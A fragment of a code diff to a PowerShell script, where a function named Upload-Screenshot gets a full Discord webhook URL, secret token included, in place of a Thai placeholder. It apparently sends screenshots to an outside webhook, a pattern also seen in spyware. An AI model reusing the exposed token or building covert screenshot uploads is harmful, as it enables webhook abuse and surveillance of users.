@@ -36,7 +36,7 @@ function Upload-Screenshot {
         [string]$filePath
     )
 
-    $webhookUrl = 'webhook ของตัวเอง'
+    $webhookUrl = 'https://discord.com/api/webhooks/1299618920604373044/UfFxuwrcLT-7AFY50StnY5J279TIY-x2X7sMT660JYW8xBLgpV-uJ5Li0R1_ATvmr0oP'
 
     # Prepare the file data for upload
     $fileData = @{
